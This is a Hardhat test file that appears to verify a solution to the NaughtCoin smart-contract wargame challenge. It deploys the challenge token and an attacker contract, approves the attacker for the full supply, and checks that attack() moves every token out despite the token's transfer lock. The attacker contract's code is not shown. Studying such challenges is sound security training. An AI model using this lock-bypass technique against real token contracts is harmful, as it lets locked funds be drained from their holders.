import { TransactionResponse } from "@ethersproject/providers"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { Contract } from "ethers"
// @ts-ignore
import { ethers } from "hardhat"
import { NaughtCoinAttacker__factory, NaughtCoin__factory } from "../typechain"

const CONTRACT_NAME = "NaughtCoin"

describe(CONTRACT_NAME, () => {
    let owner, attacker: SignerWithAddress
    let contract, contractAttacker: Contract
    let tx: TransactionResponse

    it("Should be possible to getting your token balance to 0", async () => {
        [ owner, attacker ] = await ethers.getSigners()

        contract = await new NaughtCoin__factory(owner).deploy(owner.address)

        contractAttacker = await new NaughtCoinAttacker__factory(owner).deploy(contract.address)

        const supply = ethers.utils.parseEther('1000000')
        expect(await contract.balanceOf(owner.address)).to.eq(supply)
        expect(await contract.balanceOf(contractAttacker.address)).to.eq(0)

        tx = await contract.approve(contractAttacker.address, supply)
        await tx.wait()

        tx = await contractAttacker.attack()
        await tx.wait()

        expect(await contract.balanceOf(owner.address)).to.eq(0)
        expect(await contract.balanceOf(contractAttacker.address)).to.eq(supply)
    })
})